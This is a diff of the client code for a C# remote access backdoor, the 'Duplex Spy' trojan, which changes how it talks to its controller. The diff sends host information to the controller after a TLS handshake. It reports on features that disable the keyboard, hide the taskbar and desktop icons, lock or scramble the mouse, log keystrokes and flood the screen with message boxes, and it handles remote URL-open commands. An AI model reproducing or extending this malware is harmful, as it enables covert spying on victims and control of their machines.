@@ -1,26 +1,9 @@
 ﻿/* .o0o.--------------[ README ]--------------.o0o.
  * # INTRODUCTION
- * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V1.0.0
+ * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V2.0.0
  * AUTHOR: ISSAC
  * LANGUAGE: C#
- * 
- * # DONE
- * SEND INFORMATION
- * 
- * 
- * [ TODO LIST ]
- * KEYLOGGER
- * REMOTE PLUGIN
- * 
- * REMOTE DESKTOP
- * 
- * FILE MANAGER
- * TASK MANAGER
- * CONNECTION MANAGER
- * SERVICE MANAGER
- * WINDOW MANAGER
- * 
- * [ END OF TODO LIST ]
+ * GitHub: https://github.com/iss4cf0ng/DuplexSpyCS
  * 
  * .o0o.--------------[ README ]--------------.o0o. */
 
@@ -449,9 +432,7 @@ namespace winClient48
                 byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSslSendRAW(CMD_TLS, PARA_HELLO, clsEZData.fnGenerateRandomStr());
-
-                new Thread(() => SendInfo(victim)).Start();
+                victim.fnSendCmdParam(CMD_TLS, PARA_HELLO);
 
                 do
                 {
@@ -478,6 +459,8 @@ namespace winClient48
                         int para = header.para;
                         byte[] msg = dsp.GetMsg().msg;
 
+                        //MessageBox.Show($"{cmd},{para}");
+
                         if (cmd == 0)
                         {
                             if (para == 0)
@@ -489,9 +472,17 @@ namespace winClient48
                                 fnReconnect(victim);
                             }
                         }
-                        else if (cmd == CMD_TLS && para == PARA_ACK)
+                        else if (cmd == CMD_TLS)
                         {
-                            _ = Task.Run(() => victim.fnSendCmdParam(2, 1));
+                            if (para == 0) //Hello
+                            {
+                                victim.fnSendCmdParam(CMD_TLS, PARA_HELLO);
+                            }
+                            else if (para == PARA_ACK)
+                            {
+                                new Thread(() => SendInfo(victim)).Start();
+                                victim.fnSendCmdParam(2, 1);
+                            }
                         }
                         else if (cmd == 2)
                         {
@@ -1815,6 +1806,55 @@ namespace winClient48
                     if (funcFun == null)
                         funcFun = new clsfnFun();
 
+                    string fnGetFunState()
+                    {
+                        string BooleanToString(bool bValue) => bValue ? "True" : "False";
+
+                        bool bMouseVisible = funcFun.bMouseVisible;
+                        bool bMouseCrazy = funcFun.m_bMouseCrazy;
+                        bool bMouseLock = funcFun.m_bMouseLock;
+                        bool bMouseTrail = funcFun.m_bMouseTrail;
+
+                        bool bHideTray = funcFun.bHideTray;
+                        bool bHideDesktopIcon = funcFun.bHideDesktopIcon;
+                        bool bHideClock = funcFun.bHideClock;
+                        bool bHideStartOrb = funcFun.bHideStartOrb;
+                        bool bHideTaskbar = funcFun.bHideTaskbar;
+
+                        bool bKeySmile = keylogger.smile_key;
+                        bool bKeyDisable = keylogger.disable_keyboard;
+
+                        return string.Join(",", new string[]
+                        {
+                            //Mouse
+                            "MouseVisible:" + BooleanToString(bMouseVisible),
+                            "MouseCrazy:" + BooleanToString(bMouseCrazy),
+                            "MouseLock:" + BooleanToString(bMouseLock),
+                            "MouseTrail:" + BooleanToString(bMouseTrail),
+
+                            //HWND
+                            "HideTray:" + BooleanToString(bHideTray),
+                            "HideDesktopIcon:" + BooleanToString(bHideDesktopIcon),
+                            "HideClock:" + BooleanToString(bHideClock),
+                            "HideStartOrb:" + BooleanToString(bHideStartOrb),
+                            "HideTaskbar:" + BooleanToString(bHideTray),
+
+                            //Keyboard
+                            "KeySmile:" + BooleanToString(bKeySmile),
+                            "KeyDisable:" + BooleanToString(bKeyDisable),
+                        });
+                    }
+                    void fnSendToggleState()
+                    {
+                        v.SendCommand(string.Join("|", new string[]
+                        {
+                            "fun",
+                            "hwnd",
+                            "init",
+                            fnGetFunState(),
+                        }));
+                    }
+
                     if (cmd[1] == "msg")
                     {
                         string mode = cmd[2];
@@ -1840,11 +1880,14 @@ namespace winClient48
                                 MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);
 
                                 msg_inf = true;
-                                while (msg_inf)
+                                Task.Run(() =>
                                 {
-                                    new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
-                                    Thread.Sleep(100);
-                                }
+                                    while (msg_inf)
+                                    {
+                                        new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
+                                        Thread.Sleep(100);
+                                    }
+                                });
                             }
                             else if (param == "stop")
                             {
@@ -1941,7 +1984,6 @@ namespace winClient48
                                     }
                                 }));
 
-                                Cursor.Hide();
                                 keylogger.disable_keyboard = true;
                             }
                             else
@@ -1979,7 +2021,7 @@ namespace winClient48
                     {
                         if (cmd[2] == "set")
                         {
-                            Image img = clsGlobal.Base64ToImage(cmd[3]);
+                            Image img = clsEZData.fnBase64ToImage(cmd[3]);
                             var x = funcFun.SetWallpaper(img);
                             v.SendCommand($"fun|wp|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
                         }
@@ -2012,54 +2054,14 @@ namespace winClient48
                             x = funcFun.FlipFlopMouseTrails();
                         }
 
-                        v.SendCommand($"fun|mouse|{cmd[2]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                        //v.SendCommand($"fun|mouse|{cmd[2]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                        fnSendToggleState();
                     }
                     else if (cmd[1] == "hwnd")
                     {
                         if (cmd[2] == "init")
                         {
-                            string BooleanToString(bool bValue) => bValue ? "True" : "False";
-
-                            bool bMouseVisible = funcFun.bMouseVisible;
-                            bool bMouseCrazy = funcFun.m_bMouseCrazy;
-                            bool bMouseLock = funcFun.m_bMouseLock;
-                            bool bMouseTrail = funcFun.m_bMouseTrail;
-
-                            bool bHideTray = funcFun.bHideTray;
-                            bool bHideDesktopIcon = funcFun.bHideDesktopIcon;
-                            bool bHideClock = funcFun.bHideClock;
-                            bool bHideStartOrb = funcFun.bHideStartOrb;
-                            bool bHideTaskbar = funcFun.bHideTaskbar;
-
-                            bool bKeySmile = keylogger.smile_key;
-                            bool bKeyDisable = keylogger.disable_keyboard;
-
-                            v.SendCommand(string.Join("|", new string[]
-                            {
-                                "fun",
-                                "hwnd",
-                                "init",
-
-                                string.Join(",", new string[]
-                                {
-                                    //Mouse
-                                    "MouseVisible:" + BooleanToString(bMouseVisible),
-                                    "MouseCrazy:" + BooleanToString(bMouseCrazy),
-                                    "MouseLock:" + BooleanToString(bMouseLock),
-                                    "MouseTrail:" + BooleanToString(bMouseTrail),
-
-                                    //HWND
-                                    "HideTray:" + BooleanToString(bHideTray),
-                                    "HideDesktopIcon:" + BooleanToString(bHideDesktopIcon),
-                                    "HideClock:" + BooleanToString(bHideClock),
-                                    "HideStartOrb:" + BooleanToString(bHideStartOrb),
-                                    "HideTaskbar:" + BooleanToString(bHideTray),
-
-                                    //Keyboard
-                                    "KeySmile:" + BooleanToString(bKeySmile),
-                                    "KeyDisable:" + BooleanToString(bKeyDisable),
-                                }),
-                            }));
+                            fnSendToggleState();
                         }
                         else if (cmd[2] == "hide")
                         {
@@ -2091,6 +2093,8 @@ namespace winClient48
                         {
                             var x = funcFun.FlipFlopStartOrb();
                         }
+
+                        fnSendToggleState();
                     }
                 }
 
@@ -2422,9 +2426,7 @@ namespace winClient48
                             p.StartInfo = psi;
                             p.Start();
 
-                            p.WaitForExit();
-
-                            v.SendCommand("exec|url|down|1");
+                            v.SendCommand("exec|url|open|1");
                         }
                         else if (cmd[2] == "run")
                         {
